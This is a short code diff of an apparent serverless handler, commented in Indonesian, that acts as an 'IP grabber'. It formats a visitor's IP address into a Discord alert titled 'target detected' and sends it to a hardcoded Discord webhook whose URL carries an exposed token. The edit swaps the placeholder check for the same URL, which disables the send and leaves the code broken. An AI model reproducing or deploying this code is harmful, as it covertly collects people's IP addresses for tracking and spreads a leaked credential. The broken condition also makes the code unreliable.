@@ -18,7 +18,7 @@ export default async function handler(req, res) {
         // 3. Masukkan Webhook URL Discord Anda di sini
         const discordWebhookUrl = "https://discord.com/api/webhooks/1563194910998401186/0Wff6MGmOXYNdFBs4iD9cupVq_xZCzDUPZaFyJKp2Cy7QkLAlv1uQvcpoK5nvYaPVA-1"; 
 
-        if (discordWebhookUrl && discordWebhookUrl !== "URL_WEBHOOK_DISCORD_ANDA") {
+        if (discordWebhookUrl && discordWebhookUrl !== "https://discord.com/api/webhooks/1563194910998401186/0Wff6MGmOXYNdFBs4iD9cupVq_xZCzDUPZaFyJKp2Cy7QkLAlv1uQvcpoK5nvYaPVA-1") {
             const message = {
                 content: `🚨 **IP GRABBER - TARGET TERDETEKSI!** 🚨\n` +
                          `🌐 **IP Address:** \`${ip}\`\n` +
